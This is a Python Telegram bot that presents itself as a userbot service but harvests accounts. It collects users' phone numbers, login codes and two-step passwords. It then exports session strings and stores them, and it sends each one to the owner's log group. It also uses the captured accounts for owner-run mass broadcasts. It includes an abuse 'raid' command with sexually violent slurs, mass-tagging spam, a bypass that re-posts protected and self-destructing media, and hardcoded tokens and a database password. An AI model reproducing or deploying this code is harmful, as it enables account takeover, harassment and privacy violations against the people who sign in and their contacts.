import os
import asyncio
import random
import json
import sys
import time
from pyrogram import Client, filters, errors, handlers, idle
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread
from pymongo import MongoClient

# --- TIME STAMP FOR UPTIME ---
BOT_START_TIME = time.time()

# --- CONFIGURATION ---
API_ID = 31980984
API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
BOT_TOKEN = "8709782891:AAEZPLJQOOJ6b-9WEMXsYWJSNu2YUu14fbI"
LOG_GROUP = -1003867805165 

# INTEGRATED MONGODB URL
MONGO_URL = "mongodb+srv://misssqn_db_user:Nova01@cluster0.6xxsrwq.mongodb.net/?retryWrites=true&w=majority"

# FORCE JOIN CHANNELS/GROUPS
FSUB_CHANNELS = [
    "Genu_Bot_Support",
    "Friend_Forevrrr",
    "Villain_Loves",
    "SticrAura"
]

# STYLISH MEDIA LINKS (.mp4 file processed natively as animation)
START_VIDEO = "https://files.catbox.moe/pnaxj0.mp4"

OWNER_ID = 8724182918
OWNER_USERNAME = "@CoderNova"

# --- MONGODB STORAGE CORE SYSTEM ---
try:
    mongo_client = MongoClient(MONGO_URL)
    db = mongo_client["CoderNovaBotDB"]
    sessions_col = db["sessions"]
    print("[SUCCESS] MongoDB Database Connected Successfully!")
except Exception as e:
    print(f"[ERROR] MongoDB Connection Failed: {e}")
    sys.exit(1)

def load_local_sessions():
    try:
        data = {}
        for document in sessions_col.find():
            data[str(document["user_id"])] = document["session_str"]
        return data
    except Exception: 
        return {}

def save_local_session(user_id, session_str):
    try:
        sessions_col.update_one(
            {"user_id": str(user_id)},
            {"$set": {"session_str": session_str}},
            upsert=True
        )
    except Exception as e:
        print(f"[ERROR] Failed to save session to Mongo: {e}")

def remove_local_session(user_id):
    try:
        sessions_col.delete_one({"user_id": str(user_id)})
    except Exception:
        pass

def get_readable_time(seconds: int) -> str:
    count = 0
    ping_time = ""
    time_list = []
    time_suffix_list = ["s", "m", "h", "days"]
    while count < 4:
        count += 1
        if count < 3: remaining, time_to_add = divmod(seconds, 60)
        else: remaining, time_to_add = divmod(seconds, 24)
        if seconds == 0 and remaining == 0: break
        time_list.append(int(time_to_add))
        seconds = int(remaining)
    for x in range(len(time_list)):
        time_list[x] = str(time_list[x]) + time_suffix_list[x]
    if len(time_list) == 4:
        ping_time += time_list.pop() + ", "
    time_list.reverse()
    ping_time += ":".join(time_list)
    return ping_time

# --- WEB SERVER FOR RENDERING ---
app = Flask('')
@app.route('/')
def home(): return " can_be_rendered_online ✨"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

bot = Client("CoderNovaGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}
active_tasks = {}
running_ubots = {}

# --- SMALL CAPS KEYBOARDS & BUTTONS ---
main_buttons = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("📲 ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ", callback_data="add_btn"),
        InlineKeyboardButton("🛠️ ʜᴇʟᴘ ᴍᴇɴᴜ", callback_data="help_btn")
    ],
    [
        InlineKeyboardButton("👑 ᴏᴡɴᴇʀ", url=f"https://t.me/{OWNER_USERNAME.replace('@','') or 'CoderNova'}"),
        InlineKeyboardButton("📢 ᴜᴘᴅᴀᴛᴇ", url="https://t.me/radhesupport")
    ],
    [
        InlineKeyboardButton("📖 ɢᴜɪᴅᴇ", callback_data="guide_btn"),
        InlineKeyboardButton("❌ ᴄʟᴏsᴇ", callback_data="close")
    ]
])

help_back_button = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="back_to_start")]
])

# --- CUSTOM CHATS & RAIDS ---
DAILY_CHATS = [
    "Hii {mention} 👋\n\nKaise ho aap?",
    "Hy {mention} ✨\n\nKya chal raha hai?",
    "Kaise ho {mention} 🤗\n\nSab badhiya na?",
    "Kya kr rhe ho {mention} 🤔\n\nFree ho abhi?",
    "Kha se ho {mention} 📍\n\nApna state batana?",
    "Group me aate nhi ho {mention} 👥\n\nSab yaad karte hain aapko!",
    "Active rho yr {mention} ⚡\n\nGroup ekdum thanda pad gaya hai.",
    "Khana hua {mention} 🍽️\n\nAur kya chal raha?",
    "Or sunao {mention} ☕\n\nKuch naya taza batao.",
    "Ghar me sb kaise h {mention} 🏡\n\nSab thik thak na?",
    "Or kkrh {mention} 💬\n\nReply do jaldi se!",
    "Study krte ho ya job {mention} 🧑‍💻\n\nKya karte ho aap?",
    "Jay shree ram {mention} 🚩\n\nKahan ghum ho aajkal?",
    "Radhe radhe {mention} 🙏\n\nSuno ek baar idhar aao."
]

ABUSE_RAIDS = [
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ @target 💦\n\nᴋᴀ ʟᴀɴᴅ ɢʜᴜsᴀ ᴅᴜɴɢᴀ ᴘᴜʀᴀ\nᴊᴀ sᴀᴅᴀᴋ sᴇ ᴀᴘɴɪ ᴍᴀᴀ ᴜᴛʜᴀ ᴋᴇ ʟᴀᴀ ! 👊",
    "ɴɪᴋᴀʟ ᴍᴀᴅᴀʀᴄʜᴏᴅ @target 🔥\n\nʙᴇᴛᴀ ᴘᴀᴘᴀ sᴇ ᴘᴀɴɢᴀ ɴᴀʜɪ ʟᴇᴛᴇ\nᴛᴇʀɪ ʙᴇʜᴇɴ ᴋᴏ ʙᴇᴄʜ ᴅᴜɴɢᴀ ʙᴀᴢᴀᴀʀ ᴍᴇ !",
    "ᴍᴀᴀ ᴄʜᴜᴅᴀ ᴀᴘɴɪ @target 😂\n\nʀᴀɴᴅɪ ᴋᴇ ᴘɪʟʟᴇ ᴀᴜᴋᴀᴛ ᴍᴇ ʀᴇʜ\nᴛᴇʀɪ ᴍᴀᴍᴍʏ ᴋɪ sᴀʀᴇᴇ ᴋʜᴏʟ sᴀᴋᴛᴀ ʜᴜ ᴍᴀɪ !",
    "ᴛᴇʀɪ ʙᴇʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴀʀᴏ 🙌\n\nsᴀsᴛᴇ sʜᴀʏᴀʀ @target\nɢᴀɴᴅ ᴍᴇ ᴅᴜᴍ ɴᴀʜɪ ᴀᴜʀ ʙᴀᴀᴛᴇɪɴ ʙᴀᴅɪ ʙᴀᴅɪ !",
    "🔥 sᴍᴀsʜ ᴋᴀʀᴅᴜɴɢᴀ ᴛᴇʀɪ ɢᴀɴᴅ @target\n\nᴊᴀ ʀᴏ ᴀᴘɴɪ ᴍᴀᴀ ᴋᴇ ᴀᴀᴄʜᴀʟ ᴍᴇ\nᴘᴀᴘᴀ sᴇ ʀᴀɪᴅ ʟᴇɢᴀ ᴛᴜ ʙᴇɢɢᴀʀ !"
]

# --- FORCE JOIN CHECKER ---
async def check_force_join(c, user_id):
    not_joined = []
    for channel in FSUB_CHANNELS:
        try:
            await c.get_chat_member(channel, user_id)
        except errors.UserNotParticipant:
            not_joined.append(channel)
        except Exception:
            pass
    return not_joined

# --- USERBOT HANDLERS ---
async def alive_cmd(c, m):
    uptime = get_readable_time(int(time.time() - BOT_START_TIME))
    alive_text = (
        f"✨ **『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨\n\n"
        f"⚙️ **sʏsᴛᴇᴍ sᴛᴀᴛᴜs:** `sᴍᴏᴏᴛʜ ᴀs ғᴜᴄᴋ 🚀`\n"
        f"⏳ **ᴜᴘᴛɪᴍᴇ:** `{uptime}`\n"
        f"👤 **ᴜsᴇʀ:** {c.me.mention}\n"
        f"👑 **ᴏᴡɴᴇʀ:** {OWNER_USERNAME}"
    )
    try:
        await m.delete()
        await c.send_photo(m.chat.id, photo=ALIVE_IMG, caption=alive_text)
    except Exception:
        await m.edit_text(alive_text)

async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    input_text = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sᴀʙ?"
    await m.delete()
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid): break 
            if member.user.is_bot or member.user.is_deleted: continue
            try:
                mention = f"[{member.user.first_name or 'User'}](tg://user?id={member.user.id})"
                await c.send_message(m.chat.id, f"{input_text}\n\n{mention}")
                await asyncio.sleep(2.5)
            except errors.FloodWait as e: await asyncio.sleep(e.value)
            except Exception: pass
    except Exception: pass

async def onetag_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True 
    await m.delete()
    try:
        async for member in c.get_chat_members(m.chat.id):
            if not active_tasks.get(uid): break 
            if member.user.is_bot or member.user.is_deleted: continue
            try:
                mention = f"[{member.user.first_name or 'User'}](tg://user?id={member.user.id})"
                msg = random.choice(DAILY_CHATS).format(mention=mention)
                await c.send_message(m.chat.id, msg)
                await asyncio.sleep(3.0)
            except errors.FloodWait as e: await asyncio.sleep(e.value)
            except Exception: pass
    except Exception: pass

async def raid_cmd(c, m):
    uid = c.me.id
    args = m.text.split()
    if len(args) < 3: return await m.edit_text("❌ **ᴜsᴀɢᴇ:** `.raid 5 @username`")
    active_tasks[uid] = True 
    try:
        count, target = int(args[1]), args[2]
        await m.delete()
        for _ in range(count):
            if not active_tasks.get(uid): break 
            try:
                msg = random.choice(ABUSE_RAIDS).replace("@target", target)
                await c.send_message(m.chat.id, msg)
                await asyncio.sleep(2.0) 
            except errors.FloodWait as e: await asyncio.sleep(e.value)
            except Exception: pass
    except Exception: pass

async def stop_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = False 
    await m.edit_text("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ ʙʏ ᴄᴏᴅᴇʀɴᴏᴠᴀ 』**")

# --- ANTI-RESTRICTION MULTI-MEDIA BYPASS ---
async def restriction_bypass_handler(c, m):
    is_restricted = m.chat and getattr(m.chat, "has_protected_content", False)
    is_timer = getattr(m, "ttl_period", None) is not None or getattr(m.photo, "ttl_period", None) is not None or getattr(m.video, "ttl_period", None) is not None

    if is_restricted or is_timer:
        try:
            local_file = await m.download()
            if not local_file: return
            
            caption_text = f"✨ **[ᴄᴏᴅᴇʀɴᴏᴠᴀ sʏsᴛᴇᴍ] - ʀᴇsᴛʀɪᴄᴛɪᴏɴ ʙʏᴘᴀss sᴜᴄᴄᴇsғᴜʟʟʏ!** ✨"
            if m.photo:
                await c.send_photo(m.chat.id, local_file, caption=caption_text)
            elif m.video:
                await c.send_video(m.chat.id, local_file, caption=caption_text)
            elif m.voice:
                await c.send_voice(m.chat.id, local_file, caption=caption_text)
            elif m.animation:
                await c.send_animation(m.chat.id, local_file, caption=caption_text)
            
            if os.path.exists(local_file): os.remove(local_file)
        except Exception: pass

def register_ubot_handlers(ubot):
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(restriction_bypass_handler, (filters.photo | filters.video | filters.voice | filters.animation) & ~filters.me))

# --- BROADCAST SYSTEM ---
@bot.on_message(filters.command("broadcast") & filters.user(OWNER_ID))
async def main_broadcast(c, m):
    if len(m.command) < 3 or m.command[1] != "all":
        return await m.reply_text("❌ **ᴜsᴀɢᴇ:** `/broadcast all [ʏᴏᴜʀ ᴛᴇxᴛ]`")
    
    broadcast_text = m.text.split(None, 2)[2]
    status_msg = await m.reply_text("🚀 **ɪɴɪᴛɪᴀᴛɪɴɢ ᴍᴜʟᴛɪ-ᴀᴄᴄᴏᴜɴᴛ ᴘᴏᴏʟ ʙʀᴏᴀᴅᴄᴀsᴛ ᴠɪᴀ ᴄᴏᴅᴇʀɴᴏᴠᴀ...**")
    
    if not running_ubots:
        return await status_msg.edit("❌ **ɴᴏ ᴀᴄᴛɪᴠᴇ ᴜsᴇʀʙᴏᴛs ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴛᴏ ʟᴏᴀᴅ ʙᴀʟᴀɴᴄᴇ.**")
    
    ubot_list = list(running_ubots.values())
    total_ubots = len(ubot_list)
    success_count = 0
    
    target_chats = []
    async for dialog in bot.get_dialogs():
        target_chats.append(dialog.chat.id)
        
    for index, chat_id in enumerate(target_chats):
        assigned_ubot = ubot_list[index % total_ubots]
        try:
            await assigned_ubot.send_message(chat_id, broadcast_text)
            success_count += 1
            if success_count % 5 == 0: await asyncio.sleep(0.3)
        except errors.FloodWait as e: await asyncio.sleep(e.value)
        except Exception: pass
        
    await status_msg.edit(f"✅ **ʙʀᴏᴀᴅᴄᴀsᴛ ᴄOMPLETED sᴜᴄᴄᴇsғᴜʟʟʏ!**\n📦 ᴛᴏᴛᴀʟ ᴛʀᴀɴsᴍɪᴛᴛᴇᴅ ʜɪᴛs: `{success_count}` ᴄʜᴀᴛs.")

# --- SMALL CAPS CAPTIONS & MAIN MENUS ---
START_TEXT = """⚡ **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴄᴏᴅᴇʀɴᴏᴠᴀ sᴛʀᴀᴛᴇɢɪᴄ ᴘᴀɴᴇʟ** ⚡

ʜᴇʏ {mention}, 

ᴀᴀᴘ ɪs ᴘᴏᴡᴇʀ-ᴘᴀᴄᴋᴇᴅ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ʙᴏᴛ ᴋɪ ᴍᴀᴅᴀᴅ sᴇ ᴀᴘɴᴇ sɪᴍᴘʟᴇ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ᴋᴏ ᴇᴋ ʜɪɢʜʟʏ ᴏᴘᴛɪᴍɪᴢᴇᴅ, sᴇʟғ-ᴅᴇғᴇɴsɪᴠᴇ **ᴜsᴇʀʙᴏᴛ** ᴇɴɢɪɴᴇ ᴍᴇ ᴄᴏɴᴠᴇʀᴛ ᴋᴀʀ sᴀᴋᴛᴇ ʜᴀɪɴ.

✨ **sʏsᴛᴇᴍ ᴅᴇᴛᴀɪʟs:**
🚀 **ᴘᴏᴡᴇʀᴇᴅ ʙʏ:** {owner}
⚙️ **sᴛᴀᴛᴜs:** `ᴀᴄᴛɪᴠᴇ & ʜɪɢʜʟʏ ʀᴇsᴘᴏɴsɪᴠᴇ`
🛡️ **sʜɪᴇʟᴅ ᴠ𝟸:** `ᴀɴᴛɪ-ᴄʟᴀsʜ ғʀᴀᴍᴇᴡᴏʀᴋ ᴏɴ`

ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ʙᴜᴛᴛᴏɴs ᴋᴀ ᴜsᴇ ᴋᴀʀᴋᴇ ᴀᴘɴᴇ ᴛᴏᴏʟs ᴀᴜʀ ᴀᴄᴄᴏᴜɴᴛ ᴋᴏ sᴇᴀᴍʟᴇssʟʏ ᴄᴏɴᴛʀᴏʟ ᴋᴀʀᴇɪɴ!"""

HELP_TEXT = """🛠️ **ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ - ʜᴇʟᴘ ᴍᴇɴᴜ** 🛠️

ᴀᴀᴘ ᴀᴘɴᴇ ᴜsᴇʀʙᴏᴛ ᴀᴄᴄᴏᴜɴᴛ sᴇ ᴋɪsɪ ʙʜɪ ɢʀᴏᴜᴘ ᴍᴇ ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄᴏᴍᴍᴀɴᴅs ᴜsᴇ ᴋᴀʀ sᴀᴋᴛᴇ ʜᴀɪɴ:

🔹 `.alive` - ᴄʜᴇᴄᴋ ɪғ ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ ɪs ᴏɴʟɪɴᴇ ᴡɪᴛʜ sʏsᴛᴇᴍ ʟᴏɢs.
🔹 `.tagall [text]` - ᴍᴇɴᴛɪᴏɴs ᴀʟʟ ɢʀᴏᴜᴘ ᴍᴇᴍʙᴇʀs ᴡɪᴛʜ ᴄᴜsᴛᴏᴍ ᴛᴇxᴛ.
🔹 `.onetag` - ᴛᴀɢs ɢʀᴏᴜᴘ ᴍᴇᴍʙᴇʀs ᴏɴᴇ-ʙʏ-ᴏɴᴇ ᴡɪᴛʜ ᴄᴜsᴛᴏᴍ ʜɪɴᴅɪ ʟɪɴᴇs.
🔹 `.raid [count] [@username]` - sᴛᴀʀᴛs ᴀ ʜɪɢʜ-sᴘᴇᴇᴅ ʙʀᴇᴀᴋ-ʟɪɴᴇ ʀᴀɪᴅ.
🔹 `.stop` - sᴛᴏᴘs ᴀʟʟ ʀᴜɴɴɪɴɢ ᴘʀᴏᴄᴇssᴇs."""

GUIDE_TEXT = """📖 **ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ - sʏsᴛᴇᴍ ɢᴜɪᴅᴇ** 📖

𝟷. **ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ:** ᴄʟɪᴄᴋ ᴏɴ 'ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ' ᴀᴜʀ ᴀᴘɴᴀ ɴᴜᴍʙᴇʀ ᴠᴇʀɪғʏ ᴋᴀʀᴇɪɴ.
𝟸. **ᴀɴᴛɪ-ʀᴇsᴛʀɪᴄᴛɪᴏɴ:** sᴀʙʜɪ ᴀᴄᴄᴏᴜɴᴛs ᴍᴇ ʙᴜɪʟᴛ-ɪɴ ᴍᴇᴅɪᴀ ʙʏᴘᴀss ʜᴀɪ.
𝟹. **ғɪɢʜᴛ sʜɪᴇʟᴅ:** 𝟷𝟶𝟶+ ᴀᴄᴄᴏᴜɴᴛs ʙɪɴᴀ ᴄʟᴀsʜ ᴋɪʏᴇ ʀᴜɴ ʜᴏɴɢᴇ."""

@bot.on_message(filters.command("start") & filters.private)
async def start_handler(c, m):
    unjoined = await check_force_join(c, m.from_user.id)
    if unjoined:
        btn_layout = []
        for index, ch in enumerate(unjoined, start=1):
            btn_layout.append([InlineKeyboardButton(f"📥 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ {index}", url=f"https://t.me/{ch}")])
        btn_layout.append([InlineKeyboardButton("🔄 ᴠᴇʀɪғʏ ᴍᴇᴍʙᴇʀsʜɪᴘ", callback_data="verify_fsub")])
        
        return await m.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ!**\n\nʙᴏᴛ ᴋᴏ ᴜsᴇ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ᴋʀɪᴘʏᴀ sᴀʙʜɪ ᴄʜᴀɴɴᴇʟs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:",
            reply_markup=InlineKeyboardMarkup(btn_layout)
        )

    try: await m.reply_animation(animation=START_VIDEO, caption=START_TEXT.format(mention=m.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
    except Exception: await m.reply_text(START_TEXT.format(mention=m.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)

@bot.on_callback_query()
async def handle_callbacks(c, q):
    if q.data == "close": 
        await q.message.delete()
    elif q.data == "verify_fsub":
        unjoined = await check_force_join(c, q.from_user.id)
        if unjoined:
            await q.answer("❌ ᴀᴀᴘɴᴇ sᴀʙʜɪ ᴄʜᴀɴɴᴇʟs ᴊᴏɪɴ ɴᴀʜɪ ᴋɪʏᴇ!", show_alert=True)
        else:
            await q.message.delete()
            try: await c.send_animation(q.message.chat.id, animation=START_VIDEO, caption=START_TEXT.format(mention=q.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
            except Exception: await c.send_message(q.message.chat.id, START_TEXT.format(mention=q.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
    elif q.data == "help_btn":
        await q.message.edit_text(HELP_TEXT, reply_markup=help_back_button)
    elif q.data == "guide_btn":
        await q.message.edit_text(GUIDE_TEXT, reply_markup=help_back_button)
    elif q.data == "back_to_start":
        await q.message.delete()
        try: await c.send_animation(q.message.chat.id, animation=START_VIDEO, caption=START_TEXT.format(mention=q.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
        except Exception: await c.send_message(q.message.chat.id, START_TEXT.format(mention=q.from_user.mention, owner=OWNER_USERNAME), reply_markup=main_buttons)
    elif q.data == "add_btn":
        await q.message.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ (ᴇ.ɢ. +𝟿𝟷xxxxxxxxxx):**")
        await q.message.delete()

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid = m.from_user.id
    text = m.text
    
    unjoined = await check_force_join(c, uid)
    if unjoined: return

    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        await temp_c.connect()
        try:
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ!**\n\nᴘʟᴇᴀsᴇ sᴇɴᴅ ɪᴛ ғᴀsᴛ ʟɪᴋᴇ: `𝟷 𝟸 𝟹 𝟺 𝟻` ᴏʀ `𝟷𝟸𝟹𝟺𝟻`⚡")
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp = text.replace(" ", "")
        try:
            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
            await finalize_login(c, m, uid)
        except errors.SessionPasswordNeeded:
            user_data[uid].update({"step": "password"})
            await m.reply_text("🔐 **ᴛᴡᴏ-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ!**\n\nᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ 𝟸ғᴀ ᴘᴀssᴡᴏʀᴅ:")
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif uid in user_data and user_data[uid].get("step") == "password":
        try:
            await user_data[uid]["client"].check_password(password=text)
            await finalize_login(c, m, uid)
        except Exception as e: await m.reply_text(f"❌ `{e}`")

async def finalize_login(c, m, uid):
    data = user_data[uid]
    string = await data["client"].export_session_string()
    save_local_session(uid, string)
    ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
    register_ubot_handlers(ubot)
    await ubot.start()
    running_ubots[uid] = ubot
    
    success_msg = (
        "🎉 **sᴜᴄᴄᴇsғᴜʟʟʏ ʟᴏɢɪɴ!**\n"
        "ᴀʙ ᴀᴀᴘᴋɪ ɪᴅ ᴍᴇ ʙᴏᴛ sᴛᴀʀᴛ ʜᴏ ɢʏᴀ ʜ ᴀʙ ᴀᴀᴘ ᴀᴄᴛɪᴠᴇ ʀᴇʜ sᴋᴛᴇ ʜᴀɪɴ"
    )
    await m.reply_text(success_msg)
    try: await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ sᴇssɪᴏɴ:** `{uid}`\n`{string}`")
    except Exception: pass
    if uid in user_data: del user_data[uid]

# --- MAIN ENGINE LIFECYCLE ---
async def start_services():
    print("[INFO] Launching main Bot Engine...")
    await bot.start()
    print("[SUCCESS] Engine active and listening.")
    
    saved_sessions = load_local_sessions()
    for u_id, string in saved_sessions.items():
        try:
            ubot = Client(f"ubot_{u_id}", API_ID, API_HASH, session_string=string)
            register_ubot_handlers(ubot)
            await ubot.start()
            running_ubots[int(u_id)] = ubot
            print(f"[SUCCESS] Auto-loaded CoderNova userbot from Database: {u_id}")
        except Exception: pass

    await idle()

if __name__ == "__main__":
    # Flask Web Service initialized inside a parallel daemon thread
    Thread(target=run_web, daemon=True).start()
    
    # Modernized async event loop initializer to prevent RuntimeErrors on modern Python engines
    try:
        asyncio.run(start_services())
    except (KeyboardInterrupt, SystemExit):
        print("[INFO] Bot Stopped.")
